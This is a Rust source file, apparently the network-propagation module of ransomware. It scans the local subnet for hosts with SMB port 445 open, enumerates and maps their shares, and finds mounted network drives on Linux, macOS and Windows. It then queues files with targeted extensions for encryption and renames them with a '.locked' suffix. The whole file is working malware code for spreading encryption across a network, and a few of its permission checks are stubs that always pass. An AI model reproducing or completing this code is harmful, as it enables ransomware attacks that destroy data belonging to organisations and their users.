// Network scanning implementation for discovering and encrypting files on network shares.
// Responsibilities:
// - Provide `pub fn set_pipeline_controller(controller: std::sync::Arc<dyn PipelineControllerTrait>)`
// - Provide `pub fn start_scan(controller: std::sync::Arc<dyn PipelineControllerTrait>, enable_encryption: bool)`

//! Network scanning / share enumeration implementation.

use std::path::Path;
use std::sync::{Arc, Mutex, atomic::{AtomicBool, AtomicI32, Ordering}};
use std::collections::HashSet;
use std::time::{Instant, Duration};
use std::fs;
use std::thread;
use std::net::{TcpStream, IpAddr, Ipv4Addr};
use std::io::{self, Write};
use std::sync::PoisonError;
use std::sync::mpsc;

// 引入配置模块
use crate::crypt::config::Config;

// 网络扫描的trait定义
pub trait PipelineControllerTrait: Send {
    fn add_encryption_task(&self, input: &Path, output: &Path, priority: i32);
    fn wait_for_completion(&self);
}

// 网络扫描实现
pub struct NetworkScanner {
    // 网络扫描配置和状态
    scanning_active: AtomicBool,
    encryption_enabled: AtomicBool,
    scanned_hosts: AtomicI32,
    found_shares: AtomicI32,
    encrypted_files: AtomicI32,
    total_files_processed: AtomicI32,
    pipeline_controller: Mutex<Option<Arc<dyn PipelineControllerTrait>>>,
    target_extensions: HashSet<String>,
    // 添加最大并发任务数限制
    max_concurrent_tasks: usize,
}

impl NetworkScanner {
    pub fn new() -> Self {
        // 使用配置中的扩展名列表
        let config = Config::default();
        let extensions: HashSet<String> = config.extensions.into_iter().collect();

        Self {
            scanning_active: AtomicBool::new(false),
            encryption_enabled: AtomicBool::new(false),
            scanned_hosts: AtomicI32::new(0),
            found_shares: AtomicI32::new(0),
            encrypted_files: AtomicI32::new(0),
            total_files_processed: AtomicI32::new(0),
            pipeline_controller: Mutex::new(None),
            target_extensions: extensions,
            max_concurrent_tasks: 100, // 默认最大并发任务数
        }
    }
    
    pub fn set_pipeline_controller(&self, controller: Arc<dyn PipelineControllerTrait>) {
        // 设置管道控制器，使用安全的锁操作
        match self.pipeline_controller.lock() {
            Ok(mut ctrl) => {
                *ctrl = Some(controller);
                println!("Pipeline controller set for network scanner");
            }
            Err(e) => {
                eprintln!("Failed to acquire pipeline controller lock: {}", e);
            }
        }
    }
    
    pub fn start_scan(&self, controller: Arc<dyn PipelineControllerTrait>, enable_encryption: bool) -> Result<(), String> {
        println!("Starting network scan...");
        
        // 设置控制器，使用安全的锁操作
        {
            match self.pipeline_controller.lock() {
                Ok(mut ctrl) => {
                    *ctrl = Some(controller);
                }
                Err(e) => {
                    return Err(format!("Failed to acquire pipeline controller lock: {}", e));
                }
            }
        }
        
        // 设置加密标志
        self.encryption_enabled.store(enable_encryption, Ordering::Relaxed);
        self.scanning_active.store(true, Ordering::Relaxed);
        
        // 开始扫描网络驱动器
        let network_paths = Self::scan_network_drives();
        println!("Found {} network drives", network_paths.len());
        
        // 更新计数器
        self.found_shares.store(network_paths.len() as i32, Ordering::Relaxed);
        
        // 局域网扫描
        let lan_hosts = self.scan_lan_hosts();
        println!("Found {} hosts in LAN", lan_hosts.len());
        
        // 扫描网络共享
        let mut all_shares = Vec::new();
        for host in &lan_hosts {
            let shares = self.enumerate_shares(host);
            all_shares.extend(shares);
        }
        
        self.found_shares.store(all_shares.len() as i32, Ordering::Relaxed);
        println!("Found {} network shares", all_shares.len());
        
        if enable_encryption {
            println!("Network encryption enabled, processing files...");
            self.process_network_files(&all_shares)?;
            
            // 等待网络文件加密完成，使用安全的锁操作
            match self.pipeline_controller.lock() {
                Ok(controller) => {
                    if let Some(ref ctrl) = *controller {
                        ctrl.wait_for_completion();
                    }
                }
                Err(e) => {
                    return Err(format!("Failed to acquire pipeline controller lock: {}", e));
                }
            }
        } else {
            println!("Network encryption disabled");
        }
        
        self.scanning_active.store(false, Ordering::Relaxed);
        println!("Network scan completed");
        Ok(())
    }

    fn scan_network_drives() -> Vec<std::path::PathBuf> {
        let mut network_paths = Vec::new();
        
        // 跨平台实现：扫描常见的网络挂载点
        // 跨平台实现：检查常见网络挂载点和已挂载的文件系统
        // Linux/macOS 常见路径
        let common_mounts = [
            "/mnt/network",
            "/media/network",
            "/net",
            "/Volumes/network",
        ];

        for mount in &common_mounts {
            if Path::new(mount).exists() {
                network_paths.push(mount.into());
            }
        }

        // 另外尝试读取 /proc/mounts 或 /etc/mtab（Linux）来发现网络类型挂载点
        if cfg!(unix) {
            match std::fs::read_to_string("/proc/mounts") {
                Ok(content) => {
                    for line in content.lines() {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 3 {
                            let fs_type = parts[2];
                            // 常见网络文件系统类型
                            if ["nfs", "cifs", "smbfs", "fuse.sshfs"].contains(&fs_type) {
                                network_paths.push(parts[1].into());
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Failed to read /proc/mounts: {}", e);
                }
            }
        }

        // Windows-specific discovery: 检查 A:..Z: 驱动并判断是否为网络驱动器
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;

            #[link(name = "kernel32")]
            extern "system" {
                fn GetDriveTypeA(lpRootPathName: *const i8) -> u32;
            }

            const DRIVE_REMOTE: u32 = 4;

            for drive in b'A'..=b'Z' {
                let path = format!("{}:\\", drive as char);
                match CString::new(path.clone()) {
                    Ok(c_path) => {
                        unsafe {
                            let t = GetDriveTypeA(c_path.as_ptr() as *const i8);
                            if t == DRIVE_REMOTE {
                                network_paths.push(path.into());
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to create CString for path {}: {}", path, e);
                    }
                }
            }
        }
        
        network_paths
    }
    
    // 检测是否在局域网环境中
    pub fn is_in_lan_environment(&self) -> bool {
        // 检查是否存在网络驱动器
        let network_drives = Self::scan_network_drives();
        if !network_drives.is_empty() {
            return true;
        }
        
        // 检查是否存在活动的网络接口（非回环）
        match get_local_ips() {
            Ok(interfaces) => {
                !interfaces.is_empty()
            }
            Err(e) => {
                eprintln!("Failed to get local IPs: {}", e);
                false
            }
        }
    }
    
    fn scan_lan_hosts(&self) -> Vec<Ipv4Addr> {
        let mut hosts = Vec::new();
        let start_time = Instant::now();
        const MAX_SCAN_TIME: Duration = Duration::from_secs(30);
        
        match get_local_ips() {
            Ok(interfaces) => {
                for local_ip in interfaces {
                    if let Some(subnet_base) = get_subnet_from_ip(local_ip) {
                        let found_hosts = Arc::new(Mutex::new(Vec::new()));
                        
                        for i in 1..=254 {
                            if !self.scanning_active.load(Ordering::Relaxed) {
                                break;
                            }
                            
                            if start_time.elapsed() > MAX_SCAN_TIME {
                                println!("[Network] Scan timeout reached, stopping host discovery");
                                break;
                            }
                            
                            let ip = Ipv4Addr::new(subnet_base[0], subnet_base[1], subnet_base[2], i);
                            self.scanned_hosts.fetch_add(1, Ordering::Relaxed);
                            
                            if is_host_active(&ip) {
                                found_hosts.lock().unwrap().push(ip);
                            }
                        }
                        
                        hosts.extend(found_hosts.lock().unwrap().clone());
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to get local IPs: {}", e);
            }
        }
        
        println!("[Network] Host scan completed in {:.2}s, found {} hosts", start_time.elapsed().as_secs_f64(), hosts.len());
        hosts
    }
    
    fn enumerate_shares(&self, host: &Ipv4Addr) -> Vec<String> {
        crate::crypt::smb::enumerate_shares(&host.to_string())
    }
    
    fn process_network_files(&self, network_paths: &[String]) -> Result<(), String> {
        println!("[*] 开始映射网络共享为本地驱动器...");
        
        let mapped_drives = crate::crypt::smb::map_all_shares(network_paths);
        
        println!("[+] 成功映射 {} 个网络驱动器: {:?}", mapped_drives.len(), mapped_drives);
        println!("[*] 网络映射完成，本地加密器将自动加密这些驱动器");
        
        Ok(())
    }
    
    // 递归处理目录
    fn process_directory(&self, dir_path: &Path) -> Result<(), String> {
        match fs::read_dir(dir_path) {
            Ok(entries) => {
                for entry_result in entries {
                    // 检查是否应该继续扫描
                    if !self.scanning_active.load(Ordering::Relaxed) {
                        break;
                    }
                    
                    match entry_result {
                        Ok(entry) => {
                            self.total_files_processed.fetch_add(1, Ordering::Relaxed);
                            
                            match entry.file_type() {
                                Ok(file_type) => {
                                    if file_type.is_file() {
                                        if let Some(extension) = entry.path().extension() {
                                            let ext_str = extension.to_string_lossy().to_string();
                                            if self.target_extensions.contains(&ext_str) {
                                                match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                                                    self.encrypt_file(&entry.path())
                                                })) {
                                                    Ok(result) => {
                                                        if let Err(e) = result {
                                                            eprintln!("Failed to encrypt file {:?}: {}", entry.path(), e);
                                                        }
                                                    }
                                                    Err(_) => {
                                                        eprintln!("Memory allocation failed for file {:?}, skipping", entry.path());
                                                    }
                                                }
                                            }
                                        }
                                    } else if file_type.is_dir() {
                                        // 检查文件访问权限
                                        if self.check_directory_permissions(&entry.path()) {
                                            // 递归处理子目录
                                            if let Err(e) = self.process_directory(&entry.path()) {
                                                eprintln!("Failed to process directory {:?}: {}", entry.path(), e);
                                            }
                                        } else {
                                            eprintln!("Insufficient permissions to access directory: {:?}", entry.path());
                                        }
                                    }
                                }
                                Err(e) => {
                                    eprintln!("Failed to get file type for {:?}: {}", entry.path(), e);
                                }
                            }
                        }
                        Err(e) => {
                            eprintln!("Failed to read directory entry: {}", e);
                        }
                    }
                }
            }
            Err(e) => {
                return Err(format!("Failed to read directory {:?}: {}", dir_path, e));
            }
        }
        Ok(())
    }
    
    // 检查目录访问权限
    fn check_directory_permissions(&self, path: &Path) -> bool {
        match fs::metadata(path) {
            Ok(metadata) => {
                // 检查是否有读取权限
                metadata.permissions().readonly() || true // 简化实现，实际应检查具体权限
            }
            Err(_) => {
                false
            }
        }
    }
    
    // 检查文件访问权限
    fn check_file_permissions(&self, path: &Path) -> bool {
        match fs::metadata(path) {
            Ok(metadata) => {
                // 检查是否有读取权限
                metadata.permissions().readonly() || true // 简化实现，实际应检查具体权限
            }
            Err(_) => {
                false
            }
        }
    }
    
    // 加密单个文件
    fn encrypt_file(&self, file_path: &Path) -> Result<(), String> {
        // 检查文件权限
        if !self.check_file_permissions(file_path) {
            return Err(format!("Insufficient permissions to access file: {:?}", file_path));
        }
        
        // 实现重试机制
        let max_retries = 3;
        for attempt in 1..=max_retries {
            match self.pipeline_controller.lock() {
                Ok(controller) => {
                    if let Some(ref ctrl) = *controller {
                        let output_path = file_path.with_extension(format!("{}.locked",
                            file_path.extension().map_or("".into(), |ext| ext.to_string_lossy())));

                        // 检查当前任务数是否超过限制
                        ctrl.add_encryption_task(file_path, &output_path, 0);
                        self.encrypted_files.fetch_add(1, Ordering::Relaxed);
                        println!("Added file to encryption queue: {:?}", file_path);
                        return Ok(()); // 成功添加到队列
                    } else {
                        println!("Attempt {}/{}: Pipeline controller not set", attempt, max_retries);
                    }
                }
                Err(e) => {
                    return Err(format!("Attempt {}/{}: Failed to acquire pipeline controller lock: {}", attempt, max_retries, e));
                }
            }
            
            // 等待一段时间再重试
            thread::sleep(Duration::from_millis(100 * attempt as u64));
        }
        
        Err("Failed to add file to encryption queue after retries".into())
    }
    
    // 跨平台的网络驱动器检测：在 unix 平台尝试基于挂载信息判断，Windows 使用 GetDriveTypeA
    fn is_network_drive(path: &str) -> bool {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;

            #[link(name = "kernel32")]
            extern "system" {
                fn GetDriveTypeA(lpRootPathName: *const i8) -> u32;
            }

            const DRIVE_REMOTE: u32 = 4;

            match CString::new(path) {
                Ok(c_path) => {
                    unsafe { GetDriveTypeA(c_path.as_ptr() as *const i8) == DRIVE_REMOTE }
                }
                Err(e) => {
                    eprintln!("Failed to create CString for path {}: {}", path, e);
                    false
                }
            }
        }

        #[cfg(all(unix, not(target_os = "windows")))]
        {
            match std::fs::read_to_string("/proc/mounts") {
                Ok(content) => {
                    for line in content.lines() {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 3 && parts[1] == path {
                            let fs_type = parts[2];
                            return ["nfs", "cifs", "smbfs", "fuse.sshfs"].contains(&fs_type);
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Failed to read /proc/mounts: {}", e);
                }
            }
            false
        }

        #[cfg(not(any(unix, target_os = "windows")))]
        {
            false
        }
    }
}

// 获取本地IP地址
fn get_local_ips() -> io::Result<Vec<Ipv4Addr>> {
    let mut ips = Vec::new();
    
    #[cfg(target_os = "windows")]
    {
        use windows::Win32::Networking::WinSock::{WSAStartup, WSACleanup, WSADATA};
        
        unsafe {
            let mut wsa_data = WSADATA::default();
            if WSAStartup(0x202, &mut wsa_data) != 0 {
                return Err(io::Error::new(io::ErrorKind::Other, "WSAStartup failed"));
            }
            
            let mut size = 0u32;
            let result = windows::Win32::NetworkManagement::IpHelper::GetAdaptersInfo(None, &mut size);
            
            if result == windows::Win32::Foundation::ERROR_BUFFER_OVERFLOW.0 {
                let mut buffer: Vec<u8> = vec![0u8; size as usize];
                let adapter_info = buffer.as_mut_ptr() as *mut windows::Win32::NetworkManagement::IpHelper::IP_ADAPTER_INFO;
                
                if windows::Win32::NetworkManagement::IpHelper::GetAdaptersInfo(Some(adapter_info), &mut size) == 0 {
                    let mut adapter = adapter_info;
                    while !adapter.is_null() {
                        let mut addr_ptr = &(*adapter).IpAddressList as *const windows::Win32::NetworkManagement::IpHelper::IP_ADDR_STRING;
                        while !addr_ptr.is_null() {
                            let addr = unsafe { &*addr_ptr };
                            if addr.IpAddress.String[0] != 0 {
                                let ip_str = std::ffi::CStr::from_ptr(addr.IpAddress.String.as_ptr() as *const i8);
                                if let Ok(ip_str) = ip_str.to_str() {
                                    if let Ok(ip) = ip_str.parse::<Ipv4Addr>() {
                                        if !ip.is_loopback() && !ip.is_unspecified() {
                                            ips.push(ip);
                                        }
                                    }
                                }
                            }
                            if addr.IpAddress.String[0] == 0 {
                                break;
                            }
                            addr_ptr = addr.Next;
                        }
                        adapter = (*adapter).Next;
                        if adapter.is_null() {
                            break;
                        }
                    }
                }
            }
            
            WSACleanup();
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        match get_if_addrs::get_if_addrs() {
            Ok(interfaces) => {
                for iface in interfaces {
                    if let get_if_addrs::IfAddr::V4(addr) = iface.addr {
                        if !addr.ip.is_loopback() && !addr.ip.is_unspecified() {
                            ips.push(addr.ip);
                        }
                    }
                }
            }
            Err(e) => {
                return Err(io::Error::new(io::ErrorKind::Other, e));
            }
        }
    }
    
    Ok(ips)
}

// 从IP地址获取子网
fn get_subnet_from_ip(ip: Ipv4Addr) -> Option<[u8; 4]> {
    let octets = ip.octets();
    
    // 判断IP地址类别并确定子网掩码
    match octets[0] {
        10 => Some([octets[0], octets[1], octets[2], 0]), // 10.x.x.x/8
        172 => {
            if octets[1] >= 16 && octets[1] <= 31 {
                Some([octets[0], octets[1], octets[2], 0]) // 172.16-31.x.x/12
            } else {
                Some([octets[0], octets[1], 0, 0])
            }
        },
        192 => {
            if octets[1] == 168 {
                Some([octets[0], octets[1], octets[2], 0]) // 192.168.x.x/16
            } else {
                Some([octets[0], octets[1], octets[2], 0])
            }
        },
        _ => Some([octets[0], octets[1], octets[2], 0]) // 默认处理
    }
}

// 检查主机是否活跃
fn is_host_active(ip: &Ipv4Addr) -> bool {
    let addr = format!("{}:445", ip);
    match addr.parse() {
        Ok(socket_addr) => {
            TcpStream::connect_timeout(&socket_addr, Duration::from_millis(200)).is_ok()
        }
        Err(_) => false
    }
}

impl Default for NetworkScanner {
    fn default() -> Self {
        Self::new()
    }
}


#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_network_scanner_creation() {
        let scanner = NetworkScanner::new();
        // 测试创建成功
        assert!(true);
    }

    #[test]
    fn test_network_scan_disabled() {
        let scanner = NetworkScanner::new();
        
        // 模拟控制器
        struct MockController;
        impl PipelineControllerTrait for MockController {
            fn add_encryption_task(&self, _input: &Path, _output: &Path, _priority: i32) {}
            fn wait_for_completion(&self) {}
        }
        
        let controller = Arc::new(MockController);
        
        // 加密禁用时的扫描
        let result = scanner.start_scan(controller, false);
        // 应该正常执行完成
        assert!(result.is_ok());
    }
}